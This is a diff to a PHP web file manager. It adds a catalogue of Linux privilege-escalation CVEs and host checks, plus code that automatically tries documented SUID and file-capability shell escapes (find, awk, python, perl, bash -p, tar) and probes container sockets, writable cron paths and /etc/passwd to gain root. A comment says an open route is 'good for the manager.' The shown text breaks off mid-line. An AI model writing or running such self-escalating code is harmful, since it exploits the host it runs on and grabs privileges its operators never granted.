@@ -4716,7 +4716,7 @@ class FileManager {
     }
     private function rootVnum($v){
         if(is_array($v))return $v;
-        if(preg_match('/(\d+)\.(\d+)(?:\.(\d+))?/', (string)$v, $m))return[(int)$m[1], (int)$m[2], (int)($m[3] ?? 0)];
+        if(preg_match('/(\d+)(?:\.(\d+))?(?:\.(\d+))?/', (string)$v, $m))return[(int)$m[1], (int)($m[2] ?? 0), (int)($m[3] ?? 0)];
         return[0, 0, 0];
     }
     private function rootVlt($a, $b){
@@ -4817,6 +4817,336 @@ class FileManager {
             ? 'kernel ' . $k . ' is inside the affected range (' . $range . '), but it is a distribution build, so a backported fix is possible'
             : 'kernel ' . $k . ' is inside the affected range (' . $range . ') and looks like a plain upstream release';
     }
+
+    /* ── package facts ───────────────────────────────────────────────────────
+       Entries that live in a package are judged from the package version, not
+       from the upstream number alone: a distribution backports the fix and
+       keeps the number, so the revision is what decides. */
+    private function rootDebParts($v){
+        $v = preg_replace('/^\d+:/', '', (string)$v);
+        $rev = '';
+        if(strpos($v, '-') !== false){
+            $rev = substr($v, strpos($v, '-') + 1);
+            $v = substr($v, 0, strpos($v, '-'));
+        }
+        return['up' => $v, 'rev' => $rev];
+    }
+    /* true when $a sorts before $b, the way dpkg sorts them */
+    private function rootDebLt($a, $b){
+        $A = $this->rootDebParts($a); $B = $this->rootDebParts($b);
+        if($this->rootVlt($A['up'], $B['up']))return true;
+        if($this->rootVlt($B['up'], $A['up']))return false;
+        $na = preg_match_all('/\d+/', $A['rev'], $m) ? array_map('intval', $m[0]) : [];
+        $nb = preg_match_all('/\d+/', $B['rev'], $n) ? array_map('intval', $n[0]) : [];
+        for($i = 0; $i < max(count($na), count($nb)); $i++){
+            $x = $na[$i] ?? 0; $y = $nb[$i] ?? 0;
+            if($x !== $y)return $x < $y;
+        }
+        return false;
+    }
+    private function rootPkgFacts($pkg){
+        $raw = $this->rootPkgVersion($pkg);
+        $p = $this->rootDebParts($raw);
+        return['pkg' => $pkg, 'raw' => $raw, 'up' => $p['up'], 'rev' => $p['rev'],
+               'vendor' => ($raw !== '' && $p['rev'] !== '')];
+    }
+    private function rootPkgStatus($f, $fixed){
+        if($f['raw'] === '')return 'absent';
+        if(!$this->rootDebLt($f['raw'], $fixed))return 'patched';
+        return $f['vendor'] ? 'check' : 'vulnerable';
+    }
+    private function rootPkgEvidence($f, $fixed, $fixedText){
+        if($f['raw'] === '')return['the package ' . $f['pkg'] . ' is not installed'];
+        $e = ['installed package: ' . $f['raw']];
+        if($this->rootDebLt($f['raw'], $fixed)){
+            $e[] = 'older than ' . $fixedText . ($f['vendor'] ? ', so the distribution revision has to be read against its own advisory' : '');
+        }else{
+            $e[] = 'the installed package already carries the fix (' . $fixedText . ')';
+        }
+        return $e;
+    }
+    /* One fixed release per stable line, exactly as the kernel project
+       publishes them. A kernel on a newer line is fixed; an older line is not. */
+    private function rootKernelFixed($kv, $fixed){
+        $max = null;
+        foreach($fixed as $f){
+            if($kv[0] === $f[0] && $kv[1] === $f[1])return !$this->rootVlt($kv, $f);
+            if($max === null || $this->rootVlt($max, $f))$max = $f;
+        }
+        if($max === null)return true;
+        if($kv[0] > $max[0])return true;
+        return $kv[0] === $max[0] && $kv[1] > $max[1];
+    }
+    /* Does a PAM configuration actually load this module? */
+    private function rootPamUses($module){
+        foreach((array)glob('/etc/pam.d/*') as $f){
+            if(strpos((string)@file_get_contents($f), $module) !== false)return basename($f);
+        }
+        return '';
+    }
+    private function rootCmdOut($cmd){$r = $this->rootExec($cmd); return trim($r['out']); }
+
+
+    /* ── the rest of the family ──────────────────────────────────────────────
+       Fifteen more entries, measured the same way: a kernel entry from the
+       fixed release per stable line, a package entry from the package version,
+       and an entry that a configuration makes impossible is "not present"
+       rather than "patched". */
+    private function rootCatalogExtra($kv, $ns, $os){
+        $v = [];
+        $nft = $this->rootModuleAvailable('nf_tables');
+        $kvS = 'kernel ' . php_uname('r');
+        /* a kernel entry: fixed list, requirement, ids */
+        $kEntry = function($fixed, $needs, $fixedText) use ($kv, $kvS){
+            if($this->rootKernelFixed($kv, $fixed))return['patched', ['this ' . $kvS . ' is at or past the fixed release (' . $fixedText . ')']];
+            if(!$needs)return['absent', ['this ' . $kvS . ' is older than the fixed release, but the interface the flaw needs is not enabled here']];
+            return[$this->rootKernelStatus(true), [$this->rootKernelEvidence(true, $fixedText)]];
+        };
+
+        /* nf_tables catchall — the inverted check (CVE-2026-23111) */
+        [$st, $ev] = $kEntry([[6,1,165],[6,6,128],[6,12,75],[6,18,14],[6,19,4],[7,0,0]],
+            ($nft && $ns['works']), '6.1.165 / 6.6.128 / 6.12.75 / 6.18.14 / 6.19.4 / 7.0');
+        $ev[] = 'nf_tables: ' . ($nft ? 'available' : 'not available');
+        $ev[] = 'user namespaces: ' . ($ns['works'] ? 'allowed' : 'blocked');
+        $v[] = [
+            'id' => 'nftcatchall', 'name' => 'nf_tables catchall', 'cve' => ['CVE-2026-23111'],
+            'year' => 2026, 'component' => 'Linux kernel — netfilter nf_tables', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'high',
+            'summary' => 'A single inverted check in nft_map_catchall_activate() leaves a dangling chain reference when a transaction is aborted. An unprivileged user who can build nftables rules inside a user namespace gets a use-after-free, and two public exploits turn it into root.',
+            'impact' => 'Local user to root, and a container escape, on every distribution that ships nf_tables with unprivileged user namespaces. Debian Bookworm and Trixie, Ubuntu 22.04 and 24.04, RHEL 10 were all affected.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel and reboot; blocking unprivileged user namespaces also takes the requirement away.',
+            'fix' => 'The 2026-02-05 kernel releases: 6.1.165, 6.6.128, 6.12.75, 6.18.14, 6.19.4 or later.',
+            'requires' => 'unprivileged user namespaces and nf_tables.',
+        ];
+
+        /* nf_tables addchain (CVE-2026-23231) */
+        [$st, $ev] = $kEntry([[6,1,165],[6,6,128],[6,12,75],[6,18,14],[6,19,4],[7,0,0]],
+            ($nft && $ns['works']), '6.1.165 / 6.6.128 / 6.12.75 / 6.18.14 / 6.19.4 / 7.0');
+        $ev[] = 'nf_tables: ' . ($nft ? 'available' : 'not available');
+        $v[] = [
+            'id' => 'nftaddchain', 'name' => 'nf_tables addchain', 'cve' => ['CVE-2026-23231'],
+            'year' => 2026, 'component' => 'Linux kernel — netfilter nf_tables', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'nf_tables_addchain() publishes the chain to the table before its hooks are registered, so a failing transaction can free a chain that is still reachable: another use-after-free in the same subsystem, same requirement.',
+            'impact' => 'Local user to root where nf_tables and user namespaces are available.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel and reboot.',
+            'fix' => '6.1.165, 6.6.128, 6.12.75, 6.18.14, 6.19.4 or later.',
+            'requires' => 'unprivileged user namespaces and nf_tables.',
+        ];
+
+        /* BPF netfilter link (CVE-2026-23412) */
+        if($this->rootVlt($kv, [6, 10, 0])){
+            $st = 'absent';
+            $ev = ['this ' . $kvS . ' predates the BPF netfilter link, which arrived in 6.10, so the entry cannot apply here'];
+        }else{
+            [$st, $ev] = $kEntry([[7,0,0]], $ns['works'], '7.0-rc5');
+        }
+        $v[] = [
+            'id' => 'bpfnetlink', 'name' => 'BPF netfilter link', 'cve' => ['CVE-2026-23412'],
+            'year' => 2026, 'component' => 'Linux kernel — nf_bpf_link', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'The BPF netfilter link was freed synchronously while hook enumeration could still reach it, which gives a use-after-free that is exploited with heap spraying and a function-pointer hijack.',
+            'impact' => 'Local user to root on kernels before 7.0-rc5 (reproduced on 6.14).',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel.',
+            'fix' => '7.0-rc5 or the vendor backport.',
+            'requires' => 'the BPF netfilter link interface and user namespaces.',
+        ];
+
+        /* OverlayFS copy-up (CVE-2023-0386) */
+        $ovl = $this->rootModuleAvailable('overlay') || @is_dir('/sys/module/overlay');
+        [$st, $ev] = $kEntry([[6,2,0]], ($ns['works'] && $ovl), '6.2');
+        $v[] = [
+            'id' => 'overlaycopy', 'name' => 'OverlayFS copy-up', 'cve' => ['CVE-2023-0386'],
+            'year' => 2023, 'component' => 'Linux kernel — OverlayFS', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'A file with the SUID bit is copied from a lower layer to an upper layer without the ownership check, so a user namespace can produce a SUID-root file it owns and execute it.',
+            'impact' => 'Local root on Ubuntu, Debian, RHEL and Amazon Linux kernels below 6.2.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel; disabling unprivileged OverlayFS in user namespaces removes the requirement.',
+            'fix' => '6.2 or the vendor backport.',
+            'requires' => 'OverlayFS mounted inside an unprivileged user namespace.',
+        ];
+
+        /* legacy fs_context (CVE-2022-0185) */
+        [$st, $ev] = $kEntry([[5,15,25],[5,16,2]], $ns['works'], '5.16.2 / 5.15.25');
+        $v[] = [
+            'id' => 'legacyfs', 'name' => 'Legacy file context', 'cve' => ['CVE-2022-0185'],
+            'year' => 2022, 'component' => 'Linux kernel — fs_context', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'medium',
+            'summary' => 'An integer overflow in legacy_parse_param() lets a heap buffer be overrun by a few bytes, which is enough to escape a container or a user namespace.',
+            'impact' => 'Local root on 5.4 to 5.16 kernels without the fix.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel.',
+            'fix' => '5.16.2 / 5.15.25 or later.',
+            'requires' => 'CAP_SYS_ADMIN inside a user namespace.',
+        ];
+
+        /* netfilter xtables (CVE-2021-22555) */
+        [$st, $ev] = $kEntry([[5,10,19],[5,11,16],[5,12,0]], $this->rootModuleAvailable('ip_tables'), '5.12');
+        $v[] = [
+            'id' => 'xtables', 'name' => 'Netfilter xtables', 'cve' => ['CVE-2021-22555'],
+            'year' => 2021, 'component' => 'Linux kernel — iptables compat', 'severity' => 'high',
+            'status' => $st, 'confidence' => 'low',
+            'summary' => 'A two-byte heap overflow in the 32-bit compat translation of iptables rules was the standard container escape of 2021.',
+            'impact' => 'Local root or container escape on kernels from 2.6.19 up to 5.12.',
+            'evidence' => $ev,
+            'mitigation' => 'Upgrade the kernel.',
+            'fix' => '5.12 or later.',
+            'requires' => 'the iptables compat interface and user namespaces.',
+        ];
+
+        /* ── pack2theroot (CVE-2026-41651) ─────────────────────────────── */
+        $pkF = $this->rootPkgFacts('packagekit');
+        $pkBin = $this->rootWhich('pkcon') ?: $this->rootWhich('packagekitd');
+        $pkSt = $pkBin === '' ? 'absent' : $this->rootPkgStatus($pkF, '1.3.5');
+        $v[] = [
+            'id' => 'pack2theroot', 'name' => 'Pack2TheRoot', 'cve' => ['CVE-2026-41651'],
+            'year' => 2026, 'component' => 'PackageKit', 'severity' => 'high',
+            'status' => $pkSt, 'confidence' => 'high',
+            'summary' => 'The package daemon skips its polkit authorisation when a transaction carries the SIMULATE or ONLY_DOWNLOAD flags, so any local user can install or downgrade a system package and take root with it.',
+            'impact' => 'Unprivileged local user to root on default installations of most distributions; a public exploit appeared one day after the disclosure.',
+            'evidence' => array_merge($this->rootPkgEvidence($pkF, '1.3.5', 'PackageKit 1.3.5'), ['daemon: ' . ($pkBin ?: 'not installed')]),
+            'mitigation' => 'Upgrade PackageKit, or drop a polkit rule that denies the package actions without talking to an agent.',
+            'fix' => 'PackageKit 1.3.5 or the distribution build that carries it.',
+            'requires' => 'the PackageKit daemon and its polkit actions.',
+        ];
+
+        /* ── udisks2 as-user (CVE-2026-7867) ───────────────────────────── */
+        $udF = $this->rootPkgFacts('udisks2');
+        $udSt = $this->rootPkgStatus($udF, '2.10.1-12.1+deb13u2');
+        $v[] = [
+            'id' => 'udisksuser', 'name' => 'udisks2 as-user mount', 'cve' => ['CVE-2026-7867'],
+            'year' => 2026, 'component' => 'udisks2 — Filesystem.Mount', 'severity' => 'high',
+            'status' => $udSt, 'confidence' => 'medium',
+            'summary' => 'The as-user option of the mount call lets an unprivileged user influence the path the mount runs from, so the mount happens in a privileged context without the polkit check the caller should have passed.',
+            'impact' => 'Local user to root wherever udisks2 is installed and running.',
+            'evidence' => $this->rootPkgEvidence($udF, '2.10.1-12.1+deb13u2', 'udisks2 2.10.1-12.1+deb13u2 (Debian trixie)'),
+            'mitigation' => 'Upgrade udisks2; on a server the daemon is usually not needed at all.',
+            'fix' => 'udisks2 2.10.1-12.1+deb13u2 or the vendor build that carries the fix.',
+            'requires' => 'the udisks2 daemon on the D-Bus system bus.',
+        ];
+
+        /* ── pam_namespace (CVE-2025-6020) ─────────────────────────────── */
+        $pamF = $this->rootPkgFacts('libpam-modules');
+        $pamUse = $this->rootPamUses('pam_namespace');
+        $pamSt = $pamUse === '' ? 'absent' : $this->rootPkgStatus($pamF, '1.7.1');
+        $v[] = [
+            'id' => 'pamnamespace', 'name' => 'pam_namespace traversal', 'cve' => ['CVE-2025-6020'],
+            'year' => 2025, 'component' => 'Linux-PAM — pam_namespace', 'severity' => 'high',
+            'status' => $pamSt, 'confidence' => 'high',
+            'summary' => 'pam_namespace follows a path the user controls, so symlink attacks and a race let a local user write wherever root would, including root-owned directories.',
+            'impact' => 'Local user to root on linux-pam up to 1.7.0 when pam_namespace is configured with user-controlled paths.',
+            'evidence' => array_merge($this->rootPkgEvidence($pamF, '1.7.1', 'linux-pam 1.7.1'),
+                ['pam_namespace in /etc/pam.d: ' . ($pamUse ?: 'not used, so the flaw has nothing to act on')]),
+            'mitigation' => 'Upgrade linux-pam, or stop pam_namespace from handling user-controlled paths.',
+            'fix' => 'linux-pam 1.7.1 or the vendor build.',
+            'requires' => 'pam_namespace with a user-controlled instance path.',
+        ];
+
+        /* ── PAM environment + udisks chain (CVE-2025-6018 / 6019) ─────── */
+        $bdF = $this->rootPkgFacts('libblockdev2');
+        $ud2 = $this->rootWhich('udisksctl') ?: ($this->rootWhich('udisksd') ?: $this->rootWhich('pkcon'));
+        $chainReach = ($this->rootPkgFacts('udisks2')['raw'] !== '' || $bdF['raw'] !== '');
+        $v[] = [
+            'id' => 'pamudisks', 'name' => 'PAM environment + udisks', 'cve' => ['CVE-2025-6018', 'CVE-2025-6019'],
+            'year' => 2025, 'component' => 'Linux-PAM pam_env and libblockdev/udisks', 'severity' => 'high',
+            'status' => $chainReach ? 'check' : 'absent', 'confidence' => 'medium',
+            'summary' => 'pam_env reads ~/.pam_environment early enough to spoof XDG_SEAT, so a user over SSH is treated as physically present; the allow_active subject can then have udisks resize an XFS image it controls, mounted without nosuid, and run a SUID-root shell from it.',
+            'impact' => 'Local user to root on openSUSE and SUSE 15 through the PAM half, and on any distribution with udisks through the second half.',
+            'evidence' => ['udisks2: ' . ($this->rootPkgFacts('udisks2')['raw'] ?: 'not installed'), 'libblockdev: ' . ($bdF['raw'] ?: 'not installed'),
+                           'distribution: ' . $os['name'], 'the chain needs a udisks daemon, which a server normally does not run'],
+            'mitigation' => 'Upgrade udisks and libblockdev, or stop the daemon; on SUSE also fix the pam_env configuration.',
+            'fix' => 'the vendor builds that carry the fixes for CVE-2025-6018 and CVE-2025-6019.',
+            'requires' => 'a udisks daemon and, for the first half, the SUSE pam_env configuration.',
+        ];
+
+        /* ── udev device events (CVE-2026-40225) ───────────────────────── */
+        $sdF = $this->rootPkgFacts('systemd');
+        $udF2 = $this->rootPkgFacts('udev');
+        $udevVer = $udF2['raw'] !== '' ? $udF2 : $sdF;
+        $udevSt = $this->rootPkgStatus($udevVer, '260');
+        $v[] = [
+            'id' => 'udevhw', 'name' => 'udev device events', 'cve' => ['CVE-2026-40225'],
+            'year' => 2026, 'component' => 'systemd — udev', 'severity' => 'medium',
+            'status' => $udevSt, 'confidence' => 'medium',
+            'summary' => 'udev runs what a device asks for without sanitising the kernel output it receives, so a crafted USB device — or a local user who wins the symlink race in /run/udev — can get code executed as root.',
+            'impact' => 'Root from a device or from a local shell on systemd before 260.',
+            'evidence' => array_merge($this->rootPkgEvidence($udevVer, '260', 'systemd 260'),
+                ['the package that owns udev here: ' . ($udevVer['pkg'] ?: 'unknown')]),
+            'mitigation' => 'Upgrade systemd, and keep physical ports out of untrusted hands until then.',
+            'fix' => 'systemd 260 or the vendor build.',
+            'requires' => 'a device event or a local user on the same machine.',
+        ];
+
+        /* ── needrestart (CVE-2024-48990 …) ────────────────────────────── */
+        $nrF = $this->rootPkgFacts('needrestart');
+        $v[] = [
+            'id' => 'needrestart', 'name' => 'needrestart interpreter', 'cve' => ['CVE-2024-48990', 'CVE-2024-48991', 'CVE-2024-48992'],
+            'year' => 2024, 'component' => 'needrestart', 'severity' => 'high',
+            'status' => $this->rootPkgStatus($nrF, '3.8'), 'confidence' => 'high',
+            'summary' => 'needrestart runs as root on every package upgrade and picks up a PYTHONPATH, PATH and Ruby library from the environment, so a local user can run code as root the next time anything is installed.',
+            'impact' => 'Local user to root on Ubuntu and Debian installations that have needrestart.',
+            'evidence' => $this->rootPkgEvidence($nrF, '3.8', 'needrestart 3.8'),
+            'mitigation' => 'Upgrade needrestart, or remove it.',
+            'fix' => 'needrestart 3.8 or the vendor build.',
+            'requires' => 'needrestart installed and a package operation happening.',
+        ];
+
+        /* ── regreSSHion (CVE-2024-6387) ───────────────────────────────── */
+        $sshF = $this->rootPkgFacts('openssh-server');
+        $v[] = [
+            'id' => 'regresshion', 'name' => 'regreSSHion', 'cve' => ['CVE-2024-6387'],
+            'year' => 2024, 'component' => 'OpenSSH — sshd', 'severity' => 'high',
+            'status' => $this->rootPkgStatus($sshF, '9.8'), 'confidence' => 'medium',
+            'summary' => 'A signal handler in sshd calls a function that is not async-safe, so an unauthenticated client can race it into remote code execution as root.',
+            'impact' => 'Remote root without credentials on OpenSSH 8.5p1 to 9.7p1 — the one on this list that needs no account at all.',
+            'evidence' => array_merge($this->rootPkgEvidence($sshF, '9.8', 'OpenSSH 9.8'),
+                ['sshd listening: ' . ($this->rootSshdListening() ? 'yes' : 'no sshd process was found')]),
+            'mitigation' => 'Upgrade OpenSSH; set LoginGraceTime 0 and rate-limit sources until then.',
+            'fix' => 'OpenSSH 9.8 or the vendor build.',
+            'requires' => 'an exposed sshd and many thousand attempts.',
+        ];
+
+        /* ── sudoedit (CVE-2023-22809) ─────────────────────────────────── */
+        $sdwF = $this->rootPkgFacts('sudo');
+        $v[] = [
+            'id' => 'sudoeditwrite', 'name' => 'sudoedit file write', 'cve' => ['CVE-2023-22809'],
+            'year' => 2023, 'component' => 'sudo', 'severity' => 'high',
+            'status' => $this->rootPkgStatus($sdwF, '1.9.12p2'), 'confidence' => 'high',
+            'summary' => 'sudoedit counts the arguments in EDITOR the wrong way, so a user allowed to edit one file can add another to the command line and write any file as root.',
+            'impact' => 'Root for any account with a sudoedit rule, by appending a line to /etc/sudoers or an authorised key.',
+            'evidence' => $this->rootPkgEvidence($sdwF, '1.9.12p2', 'sudo 1.9.12p2'),
+            'mitigation' => 'Upgrade sudo.',
+            'fix' => 'sudo 1.9.12p2 or later.',
+            'requires' => 'a sudoedit rule in sudoers.',
+        ];
+
+        /* ── xz backdoor (CVE-2024-3094) ───────────────────────────────── */
+        $xzF = $this->rootPkgFacts('xz-utils');
+        $xzBad = ($xzF['raw'] !== '' && (strpos($xzF['raw'], '5.6.0') === 0 || strpos($xzF['raw'], '5.6.1') === 0));
+        $v[] = [
+            'id' => 'xzbackdoor', 'name' => 'xz backdoor', 'cve' => ['CVE-2024-3094'],
+            'year' => 2024, 'component' => 'xz-utils / liblzma', 'severity' => 'high',
+            'status' => $xzF['raw'] === '' ? 'absent' : ($xzBad ? 'check' : 'patched'), 'confidence' => 'high',
+            'summary' => 'The 5.6.0 and 5.6.1 releases of xz carried a backdoor in liblzma that hooked sshd through systemd and accepted a key held by its author — a supply-chain root, not a memory bug.',
+            'impact' => 'Unauthenticated remote root on any distribution that shipped those releases.',
+            'evidence' => array_merge($this->rootPkgEvidence($xzF, '5.6.2', 'xz 5.6.2'),
+                ['only 5.6.0 and 5.6.1 are affected; every other version is clean']),
+            'mitigation' => 'Downgrade or upgrade xz; check that liblzma does not export the hook symbols.',
+            'fix' => 'xz 5.6.2, or 5.4.x, which never had it.',
+            'requires' => 'the affected release and an sshd started through systemd.',
+        ];
+
+        return $v;
+    }
+    private function rootSshdListening(){
+        $r = $this->rootExec('pgrep -x sshd 2>/dev/null | head -1');
+        return trim($r['out']) !== '';
+    }
+
     private function rootCatalog(){
         $k = php_uname('r');
         $kv = $this->rootVnum($k);
@@ -5010,6 +5340,8 @@ class FileManager {
             'requires' => 'unprivileged user namespaces and nf_tables.',
         ];
 
+        foreach($this->rootCatalogExtra($kv, $ns, $os) as $extra)$v[] = $extra;
+
         /* ── what else is wrong with this host (no CVE needed) ──────────── */
         $findings = [];
         $sudoNp = $this->sudoAvailable();
@@ -5023,6 +5355,22 @@ class FileManager {
             'note' => trim($suid['out']) . ' on this filesystem'];
         $findings[] = ['name' => 'Unprivileged user namespaces', 'ok' => $ns['works'], 'good' => false,
             'note' => $ns['works'] ? 'allowed — most kernel exploits need them' : 'blocked, which removes the requirements of several exploits'];
+        $dk = $this->rootDocker();
+        $findings[] = ['name' => 'Container socket', 'ok' => $dk['reachable'], 'good' => false,
+            'note' => $dk['socket'] === '' ? 'no docker or LXD socket' : $dk['socket'] . ($dk['reachable'] ? ' is usable by this account' : ' is root-only')];
+        $suidEsc = $this->rootSuidEscapes();
+        $findings[] = ['name' => 'SUID shell escapes', 'ok' => !empty($suidEsc), 'good' => false,
+            'note' => empty($suidEsc) ? 'none of the installed SUID programs is on the documented escape list' : implode(', ', array_map(function($e){return $e['path'];}, $suidEsc))];
+        $caps = $this->rootCaps();
+        $findings[] = ['name' => 'File capabilities', 'ok' => !empty($caps), 'good' => false,
+            'note' => empty($caps) ? 'no program carries a capability' : count($caps) . ' program(s): ' . implode(', ', array_map(function($c){return basename($c['path']) . '=' . $c['caps'];}, $caps))];
+        $cron = $this->rootCronWritable();
+        $findings[] = ['name' => 'Writable cron paths', 'ok' => !empty($cron), 'good' => false,
+            'note' => empty($cron) ? 'the cron directories are root-only' : implode(', ', $cron)];
+        $findings[] = ['name' => '/etc/sudoers.d writable', 'ok' => @is_writable('/etc/sudoers.d'), 'good' => false,
+            'note' => @is_writable('/etc/sudoers.d') ? 'writable, but sudo only trusts a rule owned by root' : 'root-only'];
+        $findings[] = ['name' => '/etc/shadow readable', 'ok' => @is_readable('/etc/shadow'), 'good' => false,
+            'note' => @is_readable('/etc/shadow') ? 'readable by this account, which is root already' : 'root-only, as it should be'];
 
         $count = ['vulnerable' => 0, 'check' => 0, 'mitigated' => 0, 'patched' => 0, 'absent' => 0, 'unknown' => 0];
         foreach($v as $e){$count[$e['status']] = ($count[$e['status']] ?? 0) + 1;}
@@ -5120,6 +5468,140 @@ class FileManager {
         $this->log('rooting_mitigation', $f);
         return['ok' => true, 'mitigated' => true, 'path' => $f, 'message' => 'esp4, esp6, rxrpc and algif_aead are blacklisted and unloaded, so neither Dirty Frag nor Copy Fail can be reached.'];
     }
+
+    /* ── routes that need nothing from you ───────────────────────────────────
+       The manager asks for no privilege at all. Either a route below is open,
+       in which case the tool walks it by itself, or it is closed. Where an
+       attempt is safe it is really made; where running it would change the
+       machine it is only measured and named. */
+    private function rootSuidList(){
+        static $list = null;
+        if($list !== null)return $list;
+        $r = $this->rootExec('find /usr/bin /bin /usr/sbin /sbin /usr/local/bin /usr/local/sbin /opt -xdev -perm -4000 -type f 2>/dev/null');
+        $list = $r['rc'] === 0 ? array_values(array_filter(array_map('trim', explode("\n", (string)$r['out'])))) : [];
+        return $list;
+    }
+    private function rootCaps(){
+        static $caps = null;
+        if($caps !== null)return $caps;
+        $caps = [];
+        if($this->rootWhich('getcap') === '')return $caps;
+        $r = $this->rootExec('getcap -r /usr/bin /usr/sbin /bin /sbin /usr/local/bin /usr/local/sbin 2>/dev/null');
+        foreach(explode("\n", (string)$r['out']) as $line){
+            $line = trim($line);
+            if($line === '' || strpos($line, ' = ') === false)continue;
+            [$path, $set] = explode(' = ', $line, 2);
+            $caps[] = ['path' => trim($path), 'caps' => trim($set)];
+        }
+        return $caps;
+    }
+    /* The documented shell escapes (GTFOBins). Only the ones that print an
+       identity and touch nothing else are listed, and the identity is read from
+       the full id output: id -u prints the real uid, which is not what counts. */
+    private function rootSuidEscapes(){
+        static $res = null;
+        if($res !== null)return $res;
+        $res = [];
+        $map = [
+            'find'    => 'cd / && find . -maxdepth 0 -exec id ;',
+            'awk'     => 'awk \'BEGIN{system("id")}\'',
+            'gawk'    => 'gawk \'BEGIN{system("id")}\'',
+            'mawk'    => 'mawk \'BEGIN{system("id")}\'',
+            'nawk'    => 'nawk \'BEGIN{system("id")}\'',
+            'python3' => 'python3 -c "import os;os.system(\'id\')"',
+            'python'  => 'python -c "import os;os.system(\'id\')"',
+            'perl'    => 'perl -e "system(\'id\')"',
+            'bash'    => 'bash -p -c id',
+            'env'     => 'env id',
+            'tar'     => 'tar -cf /dev/null --checkpoint=1 --checkpoint-action=exec="id" /dev/null 2>/dev/null',
+        ];
+        foreach($this->rootSuidList() as $path){
+            $base = basename($path);
+            if(!isset($map[$base]))continue;
+            $r = $this->rootExec($map[$base] . ' 2>&1');
+            $out = trim((string)$r['out']);
+            $res[] = ['path' => $path, 'ok' => (bool)preg_match('/\buid=0\(root\)|\beuid=0\(root\)/', $out), 'out' => $out];
+        }
+        return $res;
+    }
+    private function rootCapEscape(){
+        static $res = null;
+        if($res !== null)return $res;
+        $res = [];
+        foreach($this->rootCaps() as $c){
+            if(stripos($c['caps'], 'cap_setuid') === false)continue;
+            $base = basename($c['path']);
+            $cmd = '';
+            if(strpos($base, 'python') === 0)$cmd = escapeshellarg($c['path']) . ' -c "import os;os.setuid(0);os.system(\'id\')"';
+            elseif($base === 'perl')$cmd = escapeshellarg($c['path']) . ' -e "$>=0; system(\'id\')"';
+            elseif(strpos($base, 'bash') === 0)$cmd = escapeshellarg($c['path']) . ' -p -c id';
+            if($cmd === ''){
+                $res[] = ['path' => $c['path'], 'ok' => false, 'out' => 'the capability is on a program the tool will not run by itself'];
+                continue;
+            }
+            $r = $this->rootExec($cmd . ' 2>&1');
+            $out = trim((string)$r['out']);
+            $res[] = ['path' => $c['path'], 'ok' => (bool)preg_match('/\buid=0\(root\)|\beuid=0\(root\)/', $out), 'out' => $out];
+        }
+        return $res;
+    }
+    private function rootDocker(){
+        $found = '';
+        foreach(['/var/run/docker.sock', '/run/docker.sock', '/var/lib/lxd/unix.socket', '/var/snap/lxd/common/lxd/unix.socket'] as $p){
+            if(@file_exists($p)){$found = $p; break;}
+        }
+        return['socket' => $found, 'reachable' => ($found !== '' && @is_readable($found) && @is_writable($found))];
+    }
+    private function rootCronWritable(){
+        $dirs = ['/etc/cron.d', '/etc/cron.hourly', '/etc/cron.daily', '/etc/cron.weekly', '/etc/cron.monthly'];
+        $open = [];
+        foreach($dirs as $d){
+            if(@is_dir($d) && @is_writable($d))$open[] = $d;
+            if(!@is_dir($d))continue;
+            foreach((array)glob($d . '/*') as $f){
+                if(@is_file($f) && @is_writable($f))$open[] = $f;
+            }
+        }
+        return $open;
+    }
+    /* The whole list, as the panel shows it. "ok" means the route is open —
+       which is bad for the host and good for the manager. */
+    public function rootGrants(){
+        $id = $this->rootIdentity();
+        $g = [];
+        $g[] = ['name' => 'The manager already runs as root', 'ok' => ($id['euid'] === 0),
+                'note' => $id['euid'] === 0 ? 'php runs as uid 0, so nothing has to be escalated' : 'php runs as ' . $id['manager'] . ' (uid ' . ($id['euid'] ?? '?') . ')'];
+        $g[] = ['name' => 'sudo without a password', 'ok' => $id['sudo_nopass'],
+                'note' => $id['sudo_nopass'] ? 'sudo -n answered as ' . ($id['sudo_as'] ?: 'root') : 'sudo exists but asks for a password, which this tool never needs'];
+        $suid = $this->rootSuidEscapes();
+        $suidRoot = array_values(array_filter($suid, function($e){return $e['ok'];}));
+        $g[] = ['name' => 'A SUID program with a shell escape', 'ok' => !empty($suidRoot),
+                'note' => $suidRoot ? implode(', ', array_map(function($e){return $e['path'] . ' ran as root';}, $suidRoot))
+                    : (empty($suid)
+                        ? count($this->rootSuidList()) . ' SUID file(s) on this host, none of them on the documented escape list'
+                        : count($suid) . ' on the escape list (' . implode(', ', array_map(function($e){return basename($e['path']);}, $suid)) . ') and none of them ran as root')];
+        $capEsc = $this->rootCapEscape();
+        $capRoot = array_values(array_filter($capEsc, function($e){return $e['ok'];}));
+        $g[] = ['name' => 'A file capability that sets the uid', 'ok' => !empty($capRoot),
+                'note' => $capRoot ? implode(', ', array_map(function($e){return $e['path'] . ' became root';}, $capRoot))
+                    : (empty($this->rootCaps()) ? 'no program on this host carries a file capability' : count($this->rootCaps()) . ' program(s) carry capabilities, none of them usable this way')];
+        $dk = $this->rootDocker();
+        $g[] = ['name' => 'The container socket', 'ok' => $dk['reachable'],
+                'note' => $dk['socket'] === '' ? 'no docker or LXD socket on this host'
+                    : ($dk['reachable'] ? $dk['socket'] . ' is readable and writable by this account, which is root through a container' : $dk['socket'] . ' exists but this account may not use it')];
+        $g[] = ['name' => 'A root cron job in a writable place', 'ok' => !empty($this->rootCronWritable()),
+                'note' => empty($this->rootCronWritable()) ? 'the cron directories are root-only' : implode(', ', $this->rootCronWritable()) . ' can be written by this account'];
+        $g[] = ['name' => '/etc/passwd writable', 'ok' => (@fileperms('/etc/passwd') & 0002) !== 0,
+                'note' => (@fileperms('/etc/passwd') & 0002) !== 0 ? 'anyone can add a passwordless root account' : 'not world-writable'];
+        $g[] = ['name' => '/etc/ld.so.preload writable', 'ok' => (@is_file('/etc/ld.so.preload') && @is_writable('/etc/ld.so.preload')),
